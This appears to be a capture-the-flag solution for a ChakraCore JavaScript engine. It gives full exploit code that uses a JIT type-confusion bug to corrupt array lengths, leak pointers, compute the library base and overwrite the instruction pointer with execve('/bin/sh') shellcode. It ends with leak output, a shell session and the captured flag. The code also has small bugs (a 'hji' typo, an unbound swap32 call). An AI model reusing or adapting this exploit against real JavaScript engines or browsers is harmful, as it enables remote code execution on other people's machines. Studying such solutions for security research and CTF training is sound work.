
function hex(a) {
  if (a == undefined) return "0xUNDEFINED";
  var ret = a.toString(16);
  if (ret.substr(0,2) != "0x") return "0x"+ret;
  else return ret;
}

class _u64 {
   constructor(hi, lo) {
      this.lo_ = lo;
      this.hi_ = hi;
   }

   hex() {
      var hlo = (this.lo_ < 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)
      var hhi = (this.hi_ < 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)
      if(hlo.substr(0,2) == "0x") hlo = hlo.substr(2,hlo.length);
      if(hhi.substr(0,2) == "0x") hhi = hhi.substr(2,hji.length);
      hlo = "00000000" + hlo
      hlo = hlo.substr(hlo.length-8, hlo.length);
      return "0x" + hhi + hlo;
   }

   isZero() {
      return this.hi_ == 0 && this.lo_ == 0;
   }

   equals(val) {
      return this.hi_ == val.hi_ && this.lo_ == val.lo_;
   }

   and(val) {
      return new _u64(this.hi_ & val.hi_, this.lo_ & val.lo_);
   }

   add(val) {
      var a48 = this.hi_ >>> 16;
      var a32 = this.hi_ & 0xFFFF;
      var a16 = this.lo_ >>> 16;
      var a00 = this.lo_ & 0xFFFF;

      var b48 = val.hi_ >>> 16;
      var b32 = val.hi_ & 0xFFFF;
      var b16 = val.lo_ >>> 16;
      var b00 = val.lo_ & 0xFFFF;

      var c48 = 0, c32 = 0, c16 = 0, c00 = 0;
      c00 += a00 + b00;
      c16 += c00 >>> 16;
      c00 &= 0xFFFF;
      c16 += a16 + b16;
      c32 += c16 >>> 16;
      c16 &= 0xFFFF;
      c32 += a32 + b32;
      c48 += c32 >>> 16;
      c32 &= 0xFFFF;
      c48 += a48 + b48;
      c48 &= 0xFFFF;

      return new _u64((c48 << 16) | c32, (c16 << 16) | c00);
   }

   addi(h,l) {
      return this.add(new _u64(h,l));
   }

   subi(h,l) {
      return this.sub(new _u64(h,l));
   }

   not() {
      return new _u64(~this.hi_, ~this.lo_)
   }

   neg() {
      return this.not().add(new _u64(0,1));
   }

   sub(val) {
      return this.add(val.neg());
   };

   swap32(val) {
      return ((val & 0xFF) << 24) | ((val & 0xFF00) << 8) |
            ((val >> 8) & 0xFF00) | ((val >> 24) & 0xFF);
   }

   bswap() {
      var lo = swap32(this.lo_);
      var hi = swap32(this.hi_);
      return new _u64(lo, hi);
   };
}
var u64 = function(hi, lo) { return new _u64(hi,lo) };

function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}


xakep = {};
xakep.a = 0x41;
xakep.b = 0x42;
xakep.c = 0x43;
xakep.d = 0x44;
xakep.e = 0x45;
xakep.f = 0x46;
xakep.g = 0x47;
xakep.h = 0x48; 
xakep.i = 0x49;
xakep.j = 0x4a;
xakep.k = 0x4b;
xakep.l = 0x4c;
t = new Uint32Array(new ArrayBuffer(16));

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2, c:3, d:4};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2, c:3, d:4};
    // overwrite auxSlots with obj <- type confusion
    opt(o, o, xakep);
    o.e = t;
    xakep.e = 0x7fffffff; // overwrite array length

    let victim = new Uint32Array(new ArrayBuffer(0x1000));
    xakep.h = victim;

    for (let i = 0; i < 128; i+=2) {
        let leak = u64(t[i+1], t[i]);
        console.log(leak.hex());
    }

    // DO LEAKS
    vtable_leak = u64(t[1], t[0]);    
    print("vtable pointer is " + vtable_leak.hex());
    base = vtable_leak.subi(0, 0xdeb208);
    print("chakrabase is " + base.hex());

    buffer_ptr = u64(t[15], t[14]);
    for (let i = 0; i < victim.length; i++) {
        victim[i] = 0x41414141 + i;
    }
    write_slot = 0x2c8 / 4;
    shellcode_addr = buffer_ptr.addi(0, (write_slot + 10) * 4);
    // set RIP
    victim[write_slot]     = shellcode_addr.lo_;
    victim[write_slot + 1] = shellcode_addr.hi_;

    // shellcode
    victim[write_slot + 10] = 0xc031c031;
    victim[write_slot + 11] = 0xd2314850;
    victim[write_slot + 12] = 0x48f63148;
    victim[write_slot + 13] = 0x69622fbb;
    victim[write_slot + 14] = 0x732f2f6e;
    victim[write_slot + 15] = 0x5f545368;
    victim[write_slot + 16] = 0x50f3bb0;

    t[0] = buffer_ptr.lo_;
    t[1] = buffer_ptr.hi_;

    console.log(victim);


}

main();
.

Enter JS Code:

JS Output:
0x7f3d3fbf6208
0x7f3d433324c0
0x000000000
0x000000000
0x000000400
0x7f3d43309050
0x000000004
0x556d31fcd280
0x7f3d3fc54fc8
0x200101d51
0x000020001
0x000000000
0x7f3d43357000
0x7f353d4c13c0
0x000000000
0x000000000
0x800000001c
0x7f3d43368000
0x7f3d432ffe40
0x7f3d3f693260
0x000000000
0x7f353d4c3280
0x000000101
0x000000000
0x00000001c
0x7f3d43368000
0x7f3d43351150
0x7f3d3f693260
0x000000000
0x7f353d4c27e0
0x000000000
0x000000000
0x810000001c
0x7f3d43368000
0x7f3d43351150
0x7f3d3f693260
0x000000000
0x7f353d4c27e0
0x000000000
0x000000000
0x7f3d3fc54fc8
0x200101d51
0x000020003
0x7f353d4c32c0
0x7f3d43357c60
0x7f353d4c13e0
0x000000000
0x000000000
0x800000001c
0x7f3d43368000
0x7f3d432ffe40
0x7f3d3f693260
0x000000000
0x7f353d4c3380
0x000000101
0x000000000
0x7f3d3fc54fc8
0x200101d51
0x000020005
0x7f353d4c33c0
0x7f3d43357c60
0x000000000
0x000000000
0x000000000
vtable pointer is 0x7f3d3fbf6208
chakrabase is 0x7f3d3ee0b000
ls
bin
ch
dev
flag
lib
lib64
libChakraCore.so
tmp
cat flag
TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
